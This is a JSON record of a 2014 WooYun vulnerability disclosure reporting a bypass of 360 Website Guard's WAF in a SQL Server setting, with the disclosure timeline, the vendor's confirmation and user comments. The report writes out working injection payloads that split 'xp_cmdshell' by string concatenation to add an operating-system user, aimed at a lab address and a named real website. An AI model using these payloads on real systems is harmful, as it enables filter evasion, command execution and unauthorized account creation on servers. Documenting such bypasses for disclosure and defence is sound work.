{"id": 2628, "wybug_id": "wooyun-2014-064705", "wybug_title": "360网站卫士waf绕过(sqlserver环境)", "wybug_corp": "奇虎360", "wybug_author": "sql", "wybug_date": "2014-06-12 23:53", "wybug_open_date": "2014-07-27 23:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向公众公开  简要描述： 360网站卫士waf绕过 详细说明：  对于mssql 进行注入，我们有很多变方法 可以绕过waf。例如执行xp_cmdshell的存储过程。我们可以这样http://192.168.1.106:81/asp/num.asp?id=1;EXEC('ma'%2b'ster..x'%2b'p_cm'%2b'dsh'%2b'ell''net user x x /add''')--进行拆分。执行后 顺利添加用户。\n\n那么我找到一个360网站卫士防护的站点。http://www.xiangshu.com/login.asp?id=1';EXEC master..xp_cmdshell '1.exe'--\n\n不拆分的情况下  直接拦截。而http://www.xiangshu.com/login.asp?id=1';EXEC('ma'%2b'ster..x'%2b'p_cm'%2b'dsh'%2b'ell''net user x x /add''')--顺利通过，没有拦截。成功绕过 360网站卫士。   漏洞证明：  同上   修复方案：  加强规则。   版权声明：转载请注明来源 sql@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-06-13 16:56 厂商回复： 感谢您对网站卫士的支持！欢迎关注360安全应急响应中心月奖励计划！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-13 00:29 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  2000    \n     2014-06-13 01:36 |    \t\tAzui \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:10        | 用一只黑色铅笔画一出舞台默剧。)\t\t \n  目测要出绕过所有waf    \n     2014-06-13 02:56 |    \t\t千域千寻 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | 帝吼天啸关山震 皇天后土伏做臣)\t\t \n  目测这是一个姿势绕过所有的waf...    \n     2014-06-13 09:07 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  mark    \n     2014-06-13 09:30 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  规则绕过    \n     2014-06-13 10:18 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  坐等连载    \n     2014-06-13 11:05 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  您好，此问题昨天已有白帽子向360漏洞响应平台提交并修复。    \n     2014-06-13 14:10 |    \t\t叶炫 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 大千世界，多得是想不通的事，多得是猜不透...)\t\t \n  坐等连载 看楼主妖娆    \n     2014-06-27 06:49 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  洞主 是复参绕过，还是？    \n     2014-07-28 00:16 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  好神奇，加了2b就能绕过    \n     2014-07-28 09:05 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  +在sql server里是字符串连接符号的说    \n     2014-07-28 14:28 |    \t\tkeke \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:8        | 目测和口算各种妹纸)\t\t \n  @f4ckbaidu 好像就你知道似的    \n     2014-08-20 14:38 |    \t\tfeather \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | )( 我不是路人 |\t Rank:9999 漏洞数:0 |)\t\t \n  exec拦截了怎么破    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}